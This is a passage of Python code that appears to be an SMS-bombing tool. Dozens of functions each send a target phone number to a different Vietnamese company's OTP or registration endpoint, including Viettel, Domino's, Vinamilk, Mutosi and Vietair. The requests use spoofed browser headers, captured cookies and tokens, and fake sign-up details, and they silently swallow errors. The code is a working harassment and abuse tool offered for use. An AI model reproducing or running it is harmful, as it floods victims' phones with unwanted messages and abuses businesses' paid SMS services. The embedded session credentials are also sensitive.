"eyJhbGciOiJSUzI1NiIsImtpZCI6IjBjYjQyNzQyYWU1OGY0ZGE0NjdiY2RhZWE0Yjk1YTI5ZmJhMGM1ZjkiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMjQyNDU2MywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIyNDI0NTYzLCJleHAiOjE3MjI0MjgxNjMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.nP7jES3RVs4QgGnUoJKXml9KS7ZjOwuMlSaRklAjA7Kp8bKGmJRJFCLb1bX_am-nXovNAQ9mZ_68k7BII6SEahctrppOqeubMO-rtOfS8zOGd0_9_fWi9DBIEjEjuNJYhd55USesLwVtb5zd3fg5qjbC-QZAKo4J-V61HQvQEIBEe2EDSqDKGdtsZZ7ph33Kl5vGcpINGH-yt-2gkFAmyaoft6PpjjcS7wC_RpRkGi_bwUxG6JNXQUyBZq82T84JuqdolplXABMxd1gSBLNeBazriCAGYLsRexuvFHoet7VvEnlSm3Gnlf1oTIuR0nm1qRPsOA5W-RbZzu45fSv5jQ",
        "x-app-id": "client",
    }
    json_data = {
        "phoneNumber": phone,
        "deviceId": "d46a74f1-09b9-4db6-b022-aaa9d87e11ed",
        "use_for": "LOGIN",
    }
    response = requests.post(
        "https://api.vato.vn/api/authenticate/request_code",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_ViettelPost(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "DNT": "1",
        "Origin": "null",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    data = {
        "FormRegister.FullName": "Nguyễn Quang Ngọc",
        "FormRegister.Phone": phone,
        "FormRegister.Password": "BEAUTYBOX12a@",
        "FormRegister.ConfirmPassword": "BEAUTYBOX12a@",
        "ReturnUrl": "/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=3r25st1hpummjj42ig7zmt",
        "ConfirmOtpType": "Register",
        "FormRegister.IsRegisterFromPhone": "true",
        "__RequestVerificationToken": "CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc",
    }
    response = requests.post(
        "https://id.viettelpost.vn/Account/SendOTPByPhone", headers=headers, data=data
    )
def call_myviettel2(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
        "Content-Type": "application/json;charset=UTF-8",
        "DNT": "1",
        "Origin": "https://viettel.vn",
        "Referer": "https://viettel.vn/myviettel",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "X-CSRF-TOKEN": "PCRPIvstcYaGt1K9tSEwTQWaTADrAS8vADc3KGN7",
        "X-Requested-With": "XMLHttpRequest",
        "X-XSRF-TOKEN": "eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ==",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "msisdn": phone,
        "type": "register",
    }
    response = requests.post(
        "https://viettel.vn/api/get-otp-contract-mobile",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_myviettel3(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    cookies = {
        "laravel_session": "7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2",
        "__zi": "2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1",
        "redirectLogin": "https://viettel.vn/dang-ky",
        "XSRF-TOKEN": "eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D",
    }
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "keep-alive",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://viettel.vn",
        "Referer": "https://viettel.vn/dang-ky",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "X-CSRF-TOKEN": "HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK",
        "X-Requested-With": "XMLHttpRequest",
        "X-XSRF-TOKEN": "eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==",
        "sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "msisdn": phone,
    }
    response = requests.post(
        "https://viettel.vn/api/get-otp",
        cookies=cookies,
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_TOKYOLIFE(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://tokyolife.vn",
        "priority": "u=1, i",
        "referer": "https://tokyolife.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "signature": "c5b0d82fae6baaced6c7f383498dfeb5",
        "timestamp": "1722427632213",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "phone_number": phone,
        "name": "Nguyễn Quang Ngọc",
        "password": "pUL3.GFSd4MWYXp",
        "email": "reggg10tb@gmail.com",
        "birthday": "2002-03-12",
        "gender": "male",
    }
    response = requests.post(
        "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_30shine(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "accept": "application/json",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "authorization": "",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://30shine.com",
        "priority": "u=1, i",
        "referer": "https://30shine.com/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "phone": phone,
    }
    response = requests.post(
        "https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send",
        headers=headers,
        json=json_data,
    )
def call_Cathaylife(phone):
    cookies = {
        "JSESSIONID": "ZjlRw5Octkf1Q0h4y7wuolSd.06283f0e-f7d1-36ef-bc27-6779aba32e74",
        "TS01f67c5d": "0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67",
        "BIGipServerB2C_http": "!eqlQjZedFDGilB8R4wuMnLjIghcvhm00hRkv5r0PWCUgWACpgl2dQhq/RKFBz4cW5enIUjkvtPRi3g==",
        "TS0173f952": "0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67",
        "TSPD_101": "085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d:085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d0871bbef8b06300099f17383b7da12e0c76ce4da29c084a949802fbe8ac2e34063489a3702fb270ef592a854c40a20cd53f9829e711e0af0",
        "INITSESSIONID": "e0266dc6478152a4358bd3d4ae77bde0",
    }
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "DNT": "1",
        "Origin": "https://www.cathaylife.com.vn",
        "Referer": "https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    data = {
        "memberMap": f'{{"userName":"rancellramseyis792@gmail.com","password":"traveLo@a123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"{phone}","email":"rancellramseyis792@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyễn Quang Ngọc"}}',
        "OTP_TYPE": "P",
        "LANGS": "vi_VN",
    }
    response = requests.post(
        "https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def call_dominos(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi",
        "content-type": "application/json",
        "dmn": "DSNKFN",
        "dnt": "1",
        "origin": "https://dominos.vn",
        "priority": "u=1, i",
        "referer": "https://dominos.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "secret": "bPG0upAJLk0gz/2W1baS2Q==",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "phone_number": phone,
        "email": "rancellramseyis792@gmail.com",
        "type": 0,
        "is_register": True,
    }
    retry_strategy = Retry(
        total=3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"],
        backoff_factor=1,
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    http = requests.Session()
    http.mount("https://", adapter)
    http.mount("http://", adapter)
    try:
        response = http.post(
            "https://dominos.vn/api/v1/users/send-otp",
            headers=headers,
            json=json_data,
               timeout=10,
            stream=False,
        )
        response.raise_for_status()  # Đảm bảo rằng mọi lỗi HTTP được nâng lên
    except requests.exceptions.ChunkedEncodingError:
        pass
    except requests.exceptions.RequestException as e:
        pass
def call_vinamilk(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "authorization": "Bearer null",
        "content-type": "text/plain;charset=UTF-8",
        "dnt": "1",
        "origin": "https://new.vinamilk.com.vn",
        "priority": "u=1, i",
        "referer": "https://new.vinamilk.com.vn/account/register",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    data = f'{{"type":"register","phone":"{phone}"}}'
    response = requests.post(
        "https://new.vinamilk.com.vn/api/account/getotp", headers=headers, data=data
    )
def call_vietloan2(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    cookies = {
        "_fbp": "fb.1.1720102725444.358598086701375218",
        "_gcl_au": "1.1.619229570.1720102726",
        "mousestats_vi": "acaa606972ae539932c0",
        "_tt_enable_cookie": "1",
        "_ttp": "tGf0fClVBAWb7n4wsYwyYbdPx5W",
        "_ym_uid": "1720102728534641572",
        "_ym_d": "1720102728",
        "_gid": "GA1.2.557208002.1720622172",
        "_clck": "14x7a16%7C2%7Cfnc%7C0%7C1646",
        "_ym_isad": "2",
        "__cfruid": "92805d7d62cc6333c3436c959ecc099040706b4f-1720628273",
        "_ym_visorc": "w",
        "XSRF-TOKEN": "eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D",
        "sessionid": "eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D",
        "utm_uid": "eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D",
        "_ga": "GA1.2.1882430469.1720102726",
        "ec_png_utm": "12044e63-ea79-83c1-269a-86ba3fc88165",
        "ec_png_client": "false",
        "ec_png_client_utm": "null",
        "ec_cache_utm": "12044e63-ea79-83c1-269a-86ba3fc88165",
        "ec_cache_client": "false",
        "ec_cache_client_utm": "null",
        "ec_etag_client": "false",
        "ec_etag_utm": "12044e63-ea79-83c1-269a-86ba3fc88165",
        "ec_etag_client_utm": "null",
        "_clsk": "1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect",
        "_ga_EBK41LH7H5": "GS1.1.1720622171.4.1.1720628300.41.0.0",
        "uid": "12044e63-ea79-83c1-269a-86ba3fc88165",
        "client": "false",
        "client_utm": "null",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://vietloan.vn",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://vietloan.vn/register",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "phone": phone,
        "_token": "0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU",
    }
    response = requests.post(
        "https://vietloan.vn/register/phone-resend",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def call_batdongsan(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "dnt": "1",
        "priority": "u=1, i",
        "referer": "https://batdongsan.com.vn/sellernet/internal-sign-up",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    params = {
        "phoneNumber": phone,
    }
    response = requests.get(
        "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister",
        params=params,
        headers=headers,
    )
def call_GUMAC(phone):
    headers = {
        "Accept": "application/json",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "DNT": "1",
        "Origin": "https://gumac.vn",
        "Referer": "https://gumac.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "phone": phone,
    }
    response = requests.post(
        "https://cms.gumac.vn/api/v1/customers/verify-phone-number",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_mutosi(phone):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Authorization": "Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://mutosi.com",
        "Pragma": "no-cache",
        "Referer": "https://mutosi.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "name": "hà khải",
        "phone": phone,
        "password": "Vjyy1234@",
        "confirm_password": "Vjyy1234@",
        "firstname": None,
        "lastname": None,
        "verify_otp": 0,
        "store_token": "226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
        "email": "dđ@gmail.com",
        "birthday": "2006-02-13",
        "accept_the_terms": 1,
        "receive_promotion": 1,
    }
    try:
        response = requests.post(
            "https://api-omni.mutosi.com/client/auth/register",
            headers=headers,
            json=json_data,
            timeout=10,
        )
        response.raise_for_status()  # Raise an error for bad HTTP status codes
    except requests.exceptions.RequestException as e:
        pass
def call_mutosi1(phone):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Authorization": "Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://mutosi.com",
        "Pragma": "no-cache",
        "Referer": "https://mutosi.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "phone": phone,
        "token": "03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw",
        "source": "web_consumers",
    }
    try:
        response = requests.post(
            "https://api-omni.mutosi.com/client/auth/reset-password/send-phone",
            headers=headers,
            json=json_data,
            timeout=10,
        )
        response.raise_for_status()  # Raise an error for bad HTTP status codes
    except requests.exceptions.RequestException as e:
        pass
def call_vietair(phone):
    referer_url = f"https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={phone}"
    cookies = {
        "_gcl_au": "1.1.515899722.1720625176",
        "_tt_enable_cookie": "1",
        "_ttp": "t-FL-whNfDCNGHd27aF7syOqRSh",
        "_fbp": "fb.2.1720625180842.882992170348492798",
        "__zi": "3000.SSZzejyD3jSkdkgYo5SCqJ6U_wE7LLZFVv3duDj7Kj1jqlNsoWH8boBGzBYF0KELBTUwk8y31v8gtBUuYWuBa0.1",
        "_gid": "GA1.3.1511312052.1721112193",
        "_clck": "1eg7brl%7C2%7Cfni%7C0%7C1652",
        "_ga": "GA1.1.186819165.1720625180",
        "_ga_R4WM78RL0C": "GS1.1.1721112192.2.1.1721112216.36.0.0",
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://vietair.com.vn",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": referer_url,
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "op": "PACKAGE_HTTP_POST",
        "path_ajax_post": "/service03/sms/get",
        "package_name": "PK_FD_SMS_OTP",
        "object_name": "INS",
        "P_MOBILE": phone,
        "P_TYPE_ACTIVE_CODE": "DANG_KY_NHAN_OTP",
    }
    try:
        response = requests.post(
            "https://vietair.com.vn/Handler/CoreHandler.ashx",
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an error for bad HTTP status codes
    except requests.exceptions.RequestException as e:
        pass
def call_FAHASA(phone):
    cookies = {
        "frontend": "173c6828799e499e81cd64a949e2c73a",
        "frontend_cid": "7bCDwdDzwf8wpQKE",
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "dnt": "1",
        "origin": "https://www.fahasa.com",
        "priority": "u=1, i",
        "referer": "https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
